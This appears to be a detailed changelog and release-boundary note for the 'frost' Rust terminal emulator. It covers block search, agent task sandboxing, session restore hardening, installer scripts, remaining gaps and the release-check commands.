- **Block Search 3.0 (2026-08-26)**: the bounded per-open index now supports
  Unicode whole-word matching alongside `Aa` and regex, with `Ctrl+W` parity
  for keyboard users. Whole-word literal and regex scans validate boundaries
  without allocating per line; case-insensitive whole-word literals use the
  linear regex engine so rejected prefixes cannot turn a long log line into a
  quadratic rescan. Query errors and stale-result activation gates are unchanged.

- **Single-interpretation native JSON boundaries (2026-08-25)**: after their
  existing raw byte ceilings, the private `auth.json` reader and every Codex
  app-server JSONL record now run through
  `jterm_core::bounded_json::validate_no_duplicate_members` before typed or
  `Value` decoding. Duplicate object members are rejected recursively,
  including escaped-equivalent names and duplicates inside ignored/future
  extension objects. The private serde_json RawValue sentinel is also reserved,
  so feature-unified `Value` decoding cannot reparse unchecked embedded JSON.
  An app-server frame therefore cannot select one `id`,
  `method`, or nested result for request correlation while another decoder or
  audit surface sees a different value; credential parsing likewise has one
  structural interpretation. The shared preflight retains no decoded value
  tree and never reflects the untrusted member name in its error.

- Frost range navigation now protects the newest edge: a newer step on a
  multi-block selection first contracts it to the active newest block, and only
  the following step clears selection with explicit feedback.
  This keeps one accidental keypress from destroying a reviewed range while
  preserving the established single-block exit hatch. The shared core exact
  pin advances to `21437ba6f0cb85e74d4ce2a03ef1857de2c55d9d`, adding
  core-owned Agent claim durability and jagent's recursive duplicate-member
  rejection without changing the completed-block outcome/lifecycle contract.

- Block Search 2.0 adds `Aa` case-sensitive and bounded Rust-regex matching to
  the existing All/Failed/Slow/Bookmarked/Background picker. Invalid or
  oversized expressions are query errors rather than false zero-hit results:
  the last usable background-built index/hits remain intact but hidden and
  non-activatable until correction. Query state is rebuilt into a compact
  allocation retaining at most 4 KiB plus one complete UTF-8 overflow scalar,
  and regex compilation has a 2 MiB heap limit,
  including for whitespace-heavy pastes. Source accounting now includes its
  Vec allocation and String capacities inside the 8 MiB UI-thread retained
  ceiling; the 16 MiB worker-built retained cache counts its Vec plus original
  and lowercase capacities. Rebuild drops old cache/hit allocations before
  extracting source; the first rejected source (up to the roughly 1 MiB zone
  cap) and one rejected lowercase candidate remain short-lived allocations
  outside those retained ceilings. Only one worker generation runs at once;
  zone churn is coalesced and a stale completed build is dropped before the
  replacement snapshot is extracted. Literal case-fold expansions (`İ` → `i`
  + combining dot) and regex byte ranges both map back to original Unicode
  scalar spans, so
  previews and soft-wrap row reveal never consume normalized-string offsets.
  Activation additionally requires `!loading`, the current session/zone
  version, and exact membership in the current hit list; queued stale clicks
  remain inert.

- Held-open task terminals (Agent CLI fallback and validation runs whose child
  exited but whose tab stays for transcript review) now behave as read-only
  transcripts end to end. PTY-bound user bytes are refused before reaching the
  writer: `Session::write_pty_with_origin` gates on `transcript_read_only()`
  (exactly `hold_after_exit`), so keyboard, IME commit, every paste flavor, the
  control-key keybinding sender, mouse reports, and Agent payloads can no longer
  hit EIO on the dead master fd; the keyboard/IME/paste/keybinding dispatchers
  pre-check and surface one throttled toast ("Task terminal exited; its
  transcript is read-only", 1.6 s interval so key repeat cannot stack toasts)
  instead of a dead echo. The chrome carries the persistent affordance: tab
  strip, dock list, and window title gain an " (exited)" suffix through
  `Session::label`, and the pane header shows a dim `■ exited` chip beside the
  running-process indicator. Task terminals also leave the session snapshot
  entirely — the filter won over restore-with-suffix because task metadata is
  runtime-only and a restored plain shell parked in a task worktree is a trap.
  `session_persistence::prune_sessions` drops excluded sessions and rewrites
  every index-bearing reference against the post-filter numbering (pane-tree
  leaves, tab focus falling back to the first surviving leaf, `active_index`,
  `active_tab`); single-survivor splits collapse so the restore-side shape
  validation never sees one-child splits, tabs left without panes drop, and the
  legacy compat `tree` keeps deriving from the pruned tabs inside
  `SessionsSnapshot::new`. Exclusion covers both task-bound sessions
  (`task_for_terminal_session`, Agent and validation roles) and any
  `hold_after_exit` transcript whose binding a retry replaced. Headless tests
  cover the input-block/label predicates and pruning identity, leaf/focus/active
  remapping, split collapse, tab drop with focus repair, all-excluded, and
  fail-closed short keep lists.

- The jterm_core pin advances to `b8b1b89` (`b8b1b89148726204e2d46518ba9327d05a968f8e`,
  routing notifications through the bounded helper boundary). With the old-pin
  compatibility shim no longer needed, `src/review_text.rs` shrinks to the genuinely
  frost-specific extras — per-surface byte limits, the parameterized
  `validate_single_line`, the multiline `sanitize_prompt_payload` /
  `sanitize_history_replay` / `sanitize_untrusted_single_line`, and `visible_bounded` —
  while the duplicated visual-spoof primitives are deleted here and every former call
  site (`block_mode`, `history_picker`, `agent`, `agent_task::{native, event, task,
  diff, drivers::codex_app_server}`) now calls `jterm_core::review_input`
  (`is_visual_spoofing_character`, `contains_visual_spoofing`) directly. The three
  failed-block palette actions gain default chords in the free Ctrl+Alt letter family:
  `block:fix_with_agent` on Ctrl+Alt+X, `block:explain_with_agent` on Ctrl+Alt+E, and
  `block:retry_failed` on Ctrl+Alt+T — no collision with Ctrl+Alt+F/G/R, the pane-focus
  arrows, opacity `=`/`-`, or the Alt-copy fallback (their alt-less bases ctrl+x/e/t are
  unbound). They dispatch through the same block-context PTY-passthrough preflight, and
  the command palette, the help overlay, and the README shortcut table all list them.

- The jterm_core pin advances to `86661a7` and the app-owned boundaries sink
  into it. `src/app_helpers.rs` is deleted: font and notification helpers now
  call `jterm_core::helper::{fc_list, fc_match, notify_send}` directly, which
  carry the same fixed candidates, canonical-chain trust, clamped child PATH,
  per-stream byte caps, and single group-killing deadline on top of core's
  `SupervisedChild`. `link::is_openable_url` delegates to
  `jterm_core::link::is_openable_url`, the family-shared HTTP(S)-only opener
  policy. `persistence::prepare_command_history_path` is now a one-line
  delegate to `jterm_core::command_history::prepare_path` — the preflight the
  old pin lacked — and its three regression tests moved to core with the
  implementation. The session decoder's text budget and borrowed deferred raw
  fields now come from `jterm_core::bounded_json` (`TextBudget`,
  `DeferredRawField`); only frost's schema, repair counters, and seeds remain
  app-side.

- The experimental native Codex task runtime is ported from ember as `src/agent_task/`
  (context, diff, driver, event, launcher, native, runtime, task, validation, worktree,
  the app-server and fake drivers, plus `pinned_dir` descriptor capabilities), with the
  iced-side state in `src/agent_task_ui.rs`. The feature is gated by
  `experimental_task_sidebar = false` and adds a **Tasks** dock panel plus a failed-block
  **Create task** menu action. **Start Codex** enters a bounded, cancellable background
  Preparing phase (registered-worktree verification, descriptor pinning, trusted
  codex/node launcher resolution, prompt construction, private 0700 `CODEX_HOME`) driven
  by a 50 ms/500 ms iced tick rather than egui repaints; completion is gated by task
  generation plus the still-current `ai_enabled` + `ai_share_command_context` policy, and
  cancelled/stale/revoked results drop their directory capabilities, credential buffers,
  and temp home without spawning. The provider worker re-proves Git identity and the
  trusted launch chain immediately before spawn. The native protocol stays version-gated
  to the audited codex-cli 0.147.0 app-server identity with access-token-only login,
  pre-thread effective-config attestation (rejecting inherited MCP/hooks/plugins/apps/
  project trust/managed authority), hosted search and tool network disabled, approval
  policy `never`, and display-and-deny managed approvals (Deny only). Sequential
  follow-up turns reuse the same loaded thread with identical cwd/sandbox/env/approval
  authority, duplicate/overlapping turns are rejected, live sessions cap at 32 turns
  with completed-turn tombstones, a later turn invalidates earlier validation evidence,
  and **Finish Codex** (cgroup empty + leader reaped before the terminal event) gates
  validation; sessions remain single-use with no resume. Containment keeps the
  descriptor-pinned worktree plus transient user-systemd cgroup (cgroup v2,
  `cgroup.kill` guardian), `/tmp` excluded from writable roots, and a no-login,
  proxy-free tool environment with a vetted absolute PATH. Validation replays the exact
  single-line source command in a separate read-only-after-exit terminal: canonical
  source-subdir → worktree mapping, missing-dir/control/bidi/symlink-escape rejection,
  non-login no-rc shell argv plus `BASH_ENV`/`ENV`/`ZDOTDIR=/dev/null` (new
  `Pty::new_with_cwd_env` extra-env seam), Git registration + branch rechecked, and the
  cwd carried through the pinned descriptor's `/proc/self/fd` path. Results land as
  running/passed/failed/needs-review/cancelled via the PTY-exit hook (real child status
  from `Pty::exited_code`); pass-gated **Mark complete** stays explicit. **Review diff**
  runs the bounded `git status --short` + tracked `git diff <base>` worker. The opaque
  terminal fallback (direct, retry, or post-native-failure) spawns a new tab in the
  worktree through the trusted launcher argv and atomically rebinds the task's terminal
  session, preserving sticky Terminal/TerminalFallback provenance; task-bound PTY exits
  and closes reduce through `handle_terminal_session_exit`/`_closed` keyed by frost-local
  stable session strings. OSC 133 command zones now record `command_exact` (metadata vs
  prompt-row reconstruction) so validation keeps failing closed on inexact commands.
  Task metadata is runtime-only; **Hide task** archives metadata and leaves the worktree.

- Failed completed blocks now expose ember's Fix / Explain / Retry action chain through the
  block context menu and the command palette, adapted to the per-command-approval Shell Agent
  rather than ember's task dashboard. Fix/Explain start a fresh Agent task bound to the source
  pane by stable session id: the path never claims the persisted Agent snapshot, never replaces
  a running approved command, a pending model round, or an open transcript, and attaches the
  exact command, bounded captured output, and verified cwd as framed untrusted context. Retry is
  a guarded semantic replay into the source pane: exact, non-truncated (16 KiB capture),
  single-line commands only, at an idle empty bracketed-paste prompt on the main screen, and only
  while the recorded cwd matches an independently observed local shell-process cwd; SSH/tmux-style
  wrappers fail closed because their local process cwd is not the reported workspace. Background
  blocks and unknown-status records are never eligible; eligibility, cwd provenance, and the
  Agent replace-guards are pure functions/unit-tested state-machine paths.

- OSC 8 metadata now reaches the ordinary link interaction pipeline. URI and id fields
  are rejected before allocation above 2 KiB / 256 B, the terminal-local interner is
  capped at 4096 entries, and compact cell keys survive live-grid edits, in-memory
  scrollback compression, scrolling, resize/reflow, and safe alternate-screen swaps.
  Explicit spans override overlapping heuristic links and are revalidated through the
  one HTTP(S)-only `is_openable_url` policy at parse, projection, hit-test, app merge,
  and opener boundaries. Ctrl+single-left activation carries the projection revision,
  so output or viewport movement cannot retarget a stale click.
- App-owned `fc-list`, `fc-match`, and `notify-send` calls now share a bounded helper
  process boundary. Programs resolve only from fixed absolute system candidates whose
  canonical file and directory chain is trusted. Each helper leads a process group,
  stdout and stderr drain concurrently under independent byte caps, and one deadline
  terminates and reaps the entire group. Exit observation uses `waitid(WNOWAIT)` so the
  group leader retains its PID until cleanup and a recycled PGID can never be signalled.
- The source installer accepts `--binary PATH`, allowing release archives, CI artifacts,
  and distro staging to reuse the same path contract without Cargo. A real `DESTDIR`
  install/uninstall test checks all six artifacts, modes, launcher paths, escaping, and
  failure diagnostics. Desktop and AppStream validation now run in CI; custom desktop
  executable paths with undefined/unportable `%`, forbidden `=`, or control characters
  fail explicitly. The application manifest is `publish = false` because its exact-pinned
  git core cannot form a usable crates.io package.
- The fork-based PTY startup-timeout fixture now closes unrelated inherited descriptors
  before deliberately pausing. This mirrors the production child's immediate exec and
  prevents a parallel test's CLOEXEC process lock from remaining held by the fixture.
- The durable snapshot concurrency test now treats only the production lock's bounded
  `TimedOut` result as permissible under saturated filesystem contention. It still
  requires a complete single-generation publish with no staging residue, then performs
  another production write after every contender returns to prove the lock was released.

- Block interaction has a layout-reserved 8px gutter rather than paint over column zero.
  Finalized rows are a local static-card surface: a single prompt/header click selects,
  Shift selects a range from any card row, Ctrl+Shift toggles, and right click anywhere
  opens a pointer-anchored stable pane/zone action panel. Plain/double/triple output
  clicks retain native text selection, and Ctrl-click retains link activation. The menu
  covers selected copy/Markdown, exact-block Agent context, recall/reinput, bookmark,
  top/bottom reveal, search, and exact-block Markdown/JSON export. Mouse ownership is frozen at press time;
  right/middle releases follow their press across pane bounds, completed-row wheel input
  stays local even with primary application mouse reporting, and live/alternate-screen
  interactions still route to the PTY. Running/full-screen and disabled Block Mode
  keybindings fall through to the PTY.
- Pane-local block bookmarks have bounded-history reconciliation, wrapped previous/next
  navigation, gutter and scrollbar markers, a default toggle chord (`Ctrl+Shift+B`),
  command-palette navigation, and search integration. Clear Blocks removes bookmarks;
  disabling/re-enabling Block Mode clears hidden selection/search/menu state without
  resurrecting it.
- Cross-block search adds All/Failed/Slow/Bookmarked/Background filters, blank-query
  browsing, responsive fixed-height results, palette autoscroll, and session-bound hit
  acceptance. Hits retain Unicode-safe match spans, long previews stay centered on the
  match, and retained output resolves through soft wraps to the actual physical row.
  Trimmed/reflowed mismatches degrade through logical-line start to the block header
  rather than targeting another pane's same numeric zone id.
- Search indexing now takes a lazy newest-first source snapshot capped at 8 MiB and
  performs lowercasing on a blocking worker under a 16 MiB resident-cache budget.
  Window-monotonic epochs reject late close/reopen results, finalized-zone versions
  refresh the picker for ordinary completion, missing-D recovery, Background output,
  and bounded-history eviction, and partial indexes are disclosed separately from the
  500-hit scan cap.
- Clear Blocks is no longer an immediate destructive shortcut. Keybindings, palette,
  and the block menu share one counted confirmation bound to the stable pane and newest
  zone id; history churn requires a fresh confirmation, and the modal states that block
  records, bookmarks, and captured output are permanently removed while a live prompt
  or running command is retained.
- OSC 133 parsing now requires an exact A/B/C/D marker field and correlates ordinary C/D
  ids before consuming state. Output capture preserves no-trailing-newline and same-row
  CR/BS/CUP writes, ignores alternate-screen paint, and clamps/rebases its row/column
  extent across trimming and resize. Completion truncation uses the extractor's exact
  flag, zone-id exhaustion seals history instead of reusing an identity, and Markdown
  cwd metadata is emitted as inert code with visual-spoof controls omitted.
- Command capture is bounded to a UTF-8-safe 16 KiB prefix across visible rows and OSC
  metadata. Oversized or unavailable commands remain explicit non-Background zones,
  are marked truncated, and cannot enter Recall/Reinput, Agent, completion-history, or
  other executable-looking consumers.
- Session export now writes a versioned `frost.block-session` v1 JSON envelope carrying
  pane identity, capture time/offset, block ordering, and retention/truncation counts;
  Markdown carries the same pane/time context. The previous unversioned bare JSON array
  is no longer the compatibility boundary.
- Tests now bridge real `TerminalState` OSC 133 lifecycles into session export and cover
  completed, Background, missing-D recovery, shell command truncation, exact markers,
  mismatched ids, same-row output, resize/alternate-screen boundaries, logical output
  row mapping, bookmark navigation, filtered search caps, and row-specific gutter hits.

- Agent restore now consumes `jterm_core::agent::SessionClaim`, backed by one
  atomic no-replace rename rather than the former local hard-link/unlink pair.
  Core syncs retirement of the public name before exposing a live session, so
  a crash cannot replay an already consumed approval.
  Exactly one concurrent opener restores a valid snapshot; malformed, future,
  oversized, and semantically invalid evidence remains byte-identical at its
  private claim path. An empty or rejected local session still leaves the
  public path alone, so one process exiting cannot delete a newer checkpoint
  published by another.
- Session restore now uses a schema-aware bounded decoder rather than deriving
  an owned Serde tree before sanitizing it. The v1/v2 envelope and every nested
  child are borrowed as `RawValue`; parsers are dropped before recursion, and
  sessions, tabs, pane children, ratios, tree nodes/depth, and cumulative text
  are capped before ownership. Invalid tabs decode transactionally without
  losing valid neighbours, active-tab identity is remapped by original index,
  and invalid optional tabs/tree/split layouts warn and follow the existing
  tabs → tree → split fallback. Required known fields remain strict while
  unknown fields, including long future keys, stay forward-compatible.
- Execution generations use `checked_add`; exhaustion seals the session rather
  than reusing an identity a late completion could bind to.
- Model requests carry `{session epoch, request generation}` through both
  blocking and streaming callbacks. New Task, restore, reopen, and cancellation
  replace that identity before any late reply can mutate the current transcript.
- `jsh_version_banner` now starts the probe in its own process group, drains a
  byte-bounded banner on a concurrent reader, enforces one deadline, and
  signals and reaps the whole group. A shell that daemonises a descendant
  holding the probe's stdout can no longer make the probe wait forever, and the
  banner itself is bounded.
- One link-opening policy: `is_openable_url` accepts only absolute HTTP(S) URLs
  with an authority and no userinfo, controls, whitespace, backslash, or
  visually ambiguous characters. Links open through a non-user-writable
  absolute opener — the Windows `cmd /C start` path is gone — file operands
  follow `--`, and the opener process is reaped.
- `scripts/install.sh` and `scripts/uninstall.sh` now derive the default binary
  from the same `PREFIX/bin` contract (`~/.local/bin` by default). Explicit
  `--prefix`, `--bin-dir`, and `DESTDIR` keep their existing meanings, including
  runtime launcher paths inside staged packages. A temporary-HOME dry-run suite
  covers default reinstall/uninstall, explicit overrides, and staged paths, and
  CI checks the scripts with Bash and ShellCheck.
- Completed block outcomes now delegate to
  `jterm_core::block_contract::classify_completed` using the command text already
  resolved and stored on each completed zone. Frost keeps its renderer enum and
  serialized zone shape, while failed navigation, stepping, paint, and scrollbar
  markers share the same four-way result. A commandless zone with a raw non-zero
  status remains background, and a command without a reported status remains
  unknown. Completion provenance, lifecycle health, and their assessment
  function are now direct public re-exports of the shared contract rather than
  local semantic mirrors; Frost's serializer adapters delegate to the shared
  stable snake-case vocabulary. `jterm_core` is pinned to
  `21437ba6f0cb85e74d4ce2a03ef1857de2c55d9d` (transitively jagent
  `a462ec81f3a4c6ad85a455780ced232172f127ea`). Claim-acquisition errors are
  logged with the public path and leave that path untouched; there is no
  best-effort fallback read or delete.

## Remaining release boundary

The repository still has no formal release tag, so AppStream deliberately has no
fabricated `<releases>` entry. Add the first release node with the real version and date
when the first tag is cut; `appstreamcli validate --pedantic --no-net` currently reports
that omission as its one expected pedantic note.

The former AI-panel worktree boundary is closed. The chats panel, command
suggestion, shared-store shim and `src/main.rs` wiring have all been tracked
since `7691bd0`; README now exposes the shipped `Ctrl+Shift+Alt+A` entry rather
than treating it as future behaviour. The current shared baseline exact-pins
`jterm_core` at `f60c507df59129b281822dd97d2df3a709a02ce4` and its transitive
`jagent` at `ab7552d2bf287e330f67f7b75ab766b73aa6268e` in the manifest, lockfile
and dependency policy. The only local `[patch.crates-io]` override is the
documented, Rust-source-identical cryoglyph 0.1.0 copy that selects
RustSec-fixed `lru 0.18.2`; remove it when upstream publishes the same repair.

Two things the workflow migration deliberately leaves app-owned.

The two format-policy gaps formerly recorded here are now closed: the iced view
snapshots `ArgsForm::missing()` directly rather than restating its predicate,
and each row's **Reset** action calls `ArgsForm::clear(index)` to return to the
declared default or to genuinely unset.

The `WorkflowPicker` extraction landed here rather than being deferred, so the
one thing frost's picker still owns alone is the overlay's *keyboard routing*
in `main.rs` — Enter/Escape/arrows and the click dispatch. Nothing in that is
shared-format policy, so it is not obviously a candidate for the core; it is
recorded because a reader comparing the four apps will find four copies of it.

The former redundant `BusyChatPolicy` intra-doc target in
`src/ai_chat_store.rs` is gone. Strict rustdoc is now a first-class local and CI
release gate rather than a recorded exception.

Three things the correction migration did not do, none of them papered over.

frost's shim cannot hermetically build a `CorrectionCandidate` carrying verified
(`AptIndex` / `ExecutablePath`) evidence, so its card-wiring test exercises only
the insert-only branch. `CorrectionCandidate::new` is private and every public
path to one — `parse_ai_reply`, `deterministic_candidate`,
`resolve_correction_blocking` — yields `AiUnverified` or `TargetOutput` unless a
real APT or PATH probe runs and matches, which is not hermetic on a build host.
That narrowness is deliberate and is exactly what makes it impossible for a shim
to render prose the gate never saw, so the fix is not to widen it: a
`#[cfg(feature = "test-fixtures")]` or `#[doc(hidden)]` constructor would let
each shim prove its own "Run verified command" branch. The invariant itself is
covered upstream by the core's
`the_primary_actions_label_and_its_action_never_disagree`.

The policy test reads the probe thread name off `format!("{policy:?}")` rather
than an accessor, because `CorrectionPolicy::probe_thread_name` is private with
no getter while `evidence()` and `context_sharing()` both have one. Two costs,
both measured rather than assumed: the assertion is coupled to a `derive`, and
because it compares the Debug output against `PROBE_THREAD_NAME` itself, it
proves only that that constant is what `correction_policy` passes — renaming the
constant renames both sides and the test stays green, so a thread name that no
longer says "frost" would not be caught. A one-line
`pub fn probe_thread_name(&self) -> &'static str` upstream, asserted against a
literal here, would fix both.

`CompletionFacts::output` takes the finished block's output by value, so an
enabled correction feature clones up to `MAX_CAPTURED_OUTPUT_BYTES` per finished
command. The core is explicit that a shim must pass the output whole and must
not pre-sample, and the field is `String`, so the only mitigation available here
was to short-circuit on frost's own `enabled` gate before building the facts
(`src/main.rs`, `maybe_start_command_correction`) — which means the default
configuration pays nothing, while an agent-issued or boundary-inferred
completion with the feature on still copies the whole block. `output: &str` with
`should_start` sampling from the borrow would remove the copy without weakening
the trigger; that is a core change and outside this repo.

The panel also has no "ask about the selected block" entry — the Agent panel
already owns that surface — so the store's `BlockContext` stays
schema-compatible but is always `None` for turns begun in the chats panel. The
suggestion card does attach the selected block's bounded command/output, and
only under the `ai_share_command_context` consent.

## Release checks

```text
cargo fmt --all -- --check
cargo test --locked --all-targets --all-features --no-fail-fast
cargo clippy --locked --all-targets --all-features -- -D warnings
RUSTDOCFLAGS="-D warnings" cargo doc --locked --no-deps --all-features
scripts/security-check.sh
bash scripts/test-install-paths.sh
```

The complete gate was rerun against published `jterm_core` `f60c507`. Formatting,
zero-warning Clippy and rustdoc, the 992-test matrix, and the release build pass
with the patched cryoglyph. The unified security entry point passes cargo-deny,
warnings-denied cargo-audit, duplicate reporting, Bash parsing, and ShellCheck;
the old lockfile is a negative control that fails specifically on
RUSTSEC-2026-0253. The vendored Rust sources, README, and three license files are
byte-identical to crates.io cryoglyph 0.1.0, while its manifest differs only in
the documented `lru 0.18.2` requirement.

The install-path gate also proves the runtime workflow library rather than only
the binary and desktop metadata: every accepted example is installed byte-for-
byte and mode 0644 into the selected data tree, survives `--no-desktop`, and is
removed symmetrically without deleting an adjacent user workflow. A nested
symlink below the staging `share` directory fails before the existing binary is
replaced, and default-prefix installs honour an explicit `XDG_DATA_HOME`.
